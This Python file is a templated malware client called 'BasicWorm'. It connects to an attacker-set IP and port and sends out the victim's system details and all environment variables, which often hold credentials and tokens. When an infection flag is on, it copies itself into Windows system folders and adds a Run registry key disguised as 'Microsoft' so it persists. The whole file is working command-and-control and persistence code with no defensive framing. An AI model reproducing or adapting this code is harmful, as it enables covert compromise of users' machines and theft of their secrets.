

import socket
import platform
import os
import multiprocessing
from time import sleep
from threading import Thread, Event, Lock

{% if INFECT %}
import shutil
import winreg
import sys
import ctypes
from ctypes import wintypes
{% endif %}


class BasicWorm:
    def __init__(self):
        self.name = "basic_worm"
        self._ip = "{{IP}}"
        self._port = {{PORT}}
        self.addr = (self._ip, self._port)
        self.format_code = "{{FORMAT_CODE}}"
        self.raw_len = {{RAW_LEN}}
        self.conn_pause = {{CLIENT_PAUSE_CONN}}
        self.conn_check = {{CLIENT_PAUSE_CONN}}
        self.sys_msg = "{{SYS_MSG}}"
        self.crypter = Chameleon(self.format_code)
        self.conn_event = Event()
        self.lock = Lock()
    

    def _build_socket(self):
        try:
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            print("Socket build")
            return True
        except:
            return False
    
    def connect(self):
        try:
            self.client.connect(self.addr)
            print("CONNECTED")
            return True
        except Exception as e:
            print("ERROR CONNECTION: ", e)
            return False
    
    def disconnect(self):
        try:
            self.client.shutdown(socket.SHUT_RDWR)
        except Exception as e:
            print("ERROR SHUT: ", e)
        try:
            self.client.close()
        except Exception as e:
            print("ERROR CLOSE: ", e)   
        print("CLOSE")
    
    def make_sysmsg(self, *msg):
        sys_msg = self.sys_msg
        for s in msg:
            sys_msg += s + self.sys_msg
        return sys_msg

    def recive_msg(self):
        msg = b""
        try:
            while True:
                recv = self.client.recv(self.raw_len)
                if recv == b"":
                    return None
                if recv:
                    if len(recv) < self.raw_len:
                        msg += recv
                        break
                    else:
                        msg += recv
                else:
                    return None
            
            out_msg = self.crypter.decrypt(msg)
            return out_msg
        except:
            print("ERROR recv msg")
            return None
    
    def send_msg(self, msg):
        try:
            with self.lock:
                send_msg = self.crypter.encrypt(msg)
                self.client.sendall(send_msg)
            return True
        except:
            return False 
    
    def _check_conn(self):
        while not self.conn_event.is_set():
            self.lock.acquire()
            check = self.make_sysmsg("emp")
            self.lock.release()
            if not self.send_msg(check):
                self.conn_event.set()
            sleep(self.conn_check)
    
    def check_conn(self):
        check = Thread(target=self._check_conn, daemon=True)
        check.start()

    def _get_sys_info(self):
        system = str(platform.system())
        system += " ## " + str(platform.release())
        return system
    
    def _get_env_var(self):
        try:
            env = os.environ
            self._sys_env = env
            env_var = "\n"
            for k, i in env.items():
                env_var += f"{k} : {i}\n"
            return env_var
        except:
            return "Unknown"
    
    def get_client_info(self):
        system = self._get_sys_info()
        env_var = self._get_env_var()
        msg = self.make_sysmsg("cli", self.name, system, env_var)
        self.send_msg(msg)

{% if INFECT %}
    def _cloning(self, fpath, source=None):
        if not source:
            me = os.path.abspath(sys.argv[0])
        else:
            me = source
        try:
            shutil.copy2(me, fpath)
            return os.path.join(fpath, os.path.basename(me))
        except:
            return None

    def _get_sys_path(self, index=None):
        if not index:
            index = [2, 13, 14, 20, 26, 35, 36, 37, 38, 39, 42]
        shell32 = ctypes.windll.shell32
        buff = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
        sys_path = []
        for i in index:
            result = shell32.SHGetFolderPathW(None, i, None, 0, buff)
            if result == 0:
                sys_path.append(buff.value)

        return sys_path

    def _registry_add(self, fpath):
        try:
            path = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKeyEx(path, "Software\\Microsoft\\Windows\\CurrentVersion")
            new_key = winreg.CreateKey(key, "Run")
            winreg.SetValueEx(new_key, "Microsoft", 0, winreg.REG_SZ, fpath)
            return True
        except:
            return False
    
    def cloning(self):
        loc = self._get_sys_path()
        for l in loc:
            out = self._cloning(l)
            if out:
                reg = self._registry_add(out)
                if reg:
                    return True
        return False
    
    def clone_me(self):
        self.cloning()
{% endif %}
    
    
    def START(self):
        {%if INFECT%}
        self.clone_me()
        {%endif%}
        while True:
            if not self._build_socket():
                continue
            while True:
                if self.connect():
                    self.conn_event.clear()
                    print("JUPI CONNECTED")
                    self.get_client_info()
                    break
                print(f"Cant Connect pause: {self.conn_pause} sec")
                sleep(self.conn_pause)
            sleep(1)
            next_step = self.RUN()
            if next_step:
                continue
            sleep(1)
            print("DISCONNECT")
            self.disconnect()
            break
        print("!! ENDS CLIENT !!")
    
    def RUN(self):
        self.check_conn()
        return False



